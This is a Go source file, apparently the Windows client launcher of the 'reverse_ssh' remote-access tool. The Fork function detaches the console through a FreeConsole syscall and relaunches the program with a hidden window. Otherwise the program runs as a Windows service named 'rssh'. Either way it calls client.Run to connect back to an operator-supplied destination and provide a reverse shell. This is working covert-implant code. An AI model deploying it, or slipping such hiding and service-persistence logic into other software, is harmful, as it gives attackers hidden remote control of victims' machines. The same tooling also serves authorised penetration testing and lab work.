//go:build windows

package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"syscall"
	"time"

	"github.com/NHAS/reverse_ssh/internal/client"
	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/debug"
	"golang.org/x/sys/windows/svc/eventlog"
)

var elog debug.Log

func Fork(destination, fingerprint, proxyaddress string) error {

	inService, err := svc.IsWindowsService()
	if err != nil {
		elog.Error(1, fmt.Sprintf("failed to determine if we are running in service: %v", err))
		return fmt.Errorf("failed to determine if we are running in service: %v", err)
	}

	if !inService {

		log.Println("Forking")

		modkernel32 := syscall.NewLazyDLL("kernel32.dll")
		procAttachConsole := modkernel32.NewProc("FreeConsole")
		syscall.Syscall(procAttachConsole.Addr(), 0, 0, 0, 0)

		path, _ := os.Executable()

		cmd := exec.Command(path, append([]string{"--foreground"}, os.Args[1:]...)...)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = cmd.Start()

		if cmd.Process != nil {
			cmd.Process.Release()
		}
		return nil
	}

	runService("rssh", destination, fingerprint, proxyaddress)

	return nil
}

type rsshService struct {
	Dest, Fingerprint, Proxy string
}

func runService(name, destination, fingerprint, proxyaddress string) {
	var err error

	elog, err := eventlog.Open(name)
	if err != nil {
		return
	}

	defer elog.Close()

	elog.Info(1, fmt.Sprintf("starting %s service", name))
	err = svc.Run(name, &rsshService{
		destination,
		fingerprint,
		proxyaddress,
	})
	if err != nil {
		elog.Error(1, fmt.Sprintf("%s service failed: %v", name, err))
		return
	}
	elog.Info(1, fmt.Sprintf("%s service stopped", name))
}

func (m *rsshService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown
	changes <- svc.Status{State: svc.StartPending}

	go client.Run(m.Dest, m.Fingerprint, m.Proxy)
	changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}

Outer:
	for c := range r {
		switch c.Cmd {
		case svc.Interrogate:
			changes <- c.CurrentStatus
			// Testing deadlock from https://code.google.com/p/winsvc/issues/detail?id=4
			time.Sleep(100 * time.Millisecond)
			changes <- c.CurrentStatus
		case svc.Stop, svc.Shutdown:
			break Outer
		default:
			elog.Error(1, fmt.Sprintf("unexpected control request #%d", c))
		}
	}

	changes <- svc.Status{State: svc.StopPending}
	changes <- svc.Status{State: svc.Stopped}

	os.Exit(0)
	return
}

func Run(destination, fingerprint, proxyaddress string) {

	inService, err := svc.IsWindowsService()
	if err != nil {
		log.Printf("failed to determine if we are running in service: %v", err)
		client.Run(destination, fingerprint, proxyaddress)
	}

	if !inService {

		client.Run(destination, fingerprint, proxyaddress)
		return
	}

	runService("rssh", destination, fingerprint, proxyaddress)

}
